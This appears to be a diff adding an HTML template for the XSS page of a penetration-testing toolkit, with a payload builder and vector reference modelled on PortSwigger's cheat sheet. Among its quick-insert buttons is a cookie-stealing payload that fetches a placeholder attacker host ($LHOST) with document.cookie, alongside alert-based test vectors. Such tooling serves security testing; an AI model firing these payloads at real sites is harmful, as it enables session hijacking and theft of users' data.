@@ -1,0 +1,74 @@
+{% extends "base.html" %}
+{% block content %}
+<section class="pane">
+  <div class="pane-head">
+    <h2>{{ title }}{% if tag %} <span class="tag">{{ tag }}</span>{% endif %}</h2>
+    {% if intro %}<p>{{ intro }}</p>{% endif %}
+  </div>
+
+  <!-- interactive vector builder (recreation of the PortSwigger cheat-sheet tool) -->
+  <div class="card xssgen">
+    <h3>XSS CheatSheet by Portswigger</h3>
+    <p class="hint">Build a working vector: pick a <b>tag</b> and an <b>event handler</b>, set the JS to run, and optionally break out of the surrounding context. <code>$LHOST</code>/<code>$RHOST</code> fill in live. The generated line has copy &amp; send-to-terminal, like every other command.</p>
+
+    <div class="row">
+      <div class="field">
+        <label>Tag</label>
+        <select id="xgTag"></select>
+      </div>
+      <div class="field">
+        <label>Event handler</label>
+        <select id="xgEvent"></select>
+      </div>
+      <div class="field" style="flex:1 1 260px">
+        <label>JavaScript to run</label>
+        <input type="text" id="xgPayload" value="alert(document.domain)" spellcheck="false" autocomplete="off">
+      </div>
+    </div>
+
+    <div class="xgquick">
+      <span class="lbl2">quick JS:</span>
+      <button type="button" class="tok" data-pl="alert(document.domain)">alert(document.domain)</button>
+      <button type="button" class="tok" data-pl="alert(document.cookie)">alert(document.cookie)</button>
+      <button type="button" class="tok" data-pl="print()">print()</button>
+      <button type="button" class="tok" data-pl="fetch('http://$LHOST/?c='+document.cookie)">exfil cookie &rarr; $LHOST</button>
+    </div>
+
+    <div class="row">
+      <div class="field">
+        <label>Context break-out</label>
+        <select id="xgCtx"></select>
+      </div>
+      <label class="chip" id="xgHelperChip"><input type="checkbox" id="xgHelper" checked><span class="box"></span>auto-fire helpers</label>
+    </div>
+
+    <div class="xgstatus" id="xgStatus"></div>
+    <div id="xgOut"></div>
+    <p class="hint xgworks" id="xgWorks"></p>
+  </div>
+
+  <!-- full vector reference, generated from the same engine -->
+  <div class="card xssref">
+    <div class="xgref-head">
+      <h3>Vector reference</h3>
+      <input type="text" id="xgFilter" placeholder="filter vectors... (tag, event, keyword)" spellcheck="false" autocomplete="off">
+    </div>
+    <p class="hint">Ready-to-fire vectors grouped by how they trigger. Every line copies / sends and fills <code>$LHOST</code> live.</p>
+    <div id="xgRef"></div>
+  </div>
+
+  {% for card in cards %}
+  <div class="card">
+    {% if card.title %}<h3>{{ card.title }}</h3>{% endif %}
+    {% if card.hint %}<p class="hint">{{ card.hint }}</p>{% endif %}
+    {% for b in card.blocks %}
+    <div class="cmd{% if b.plain %} plain{% endif %}" data-tpl="{{ b.tpl }}">{% if b.lbl %}<span class="lbl">{{ b.lbl }}</span>{% endif %}</div>
+    {% endfor %}
+  </div>
+  {% endfor %}
+</section>
+{% endblock %}
+
+{% block scripts %}
+<script src="{{ url_for('static', filename='js/xss.js') }}"></script>
+{% endblock %}
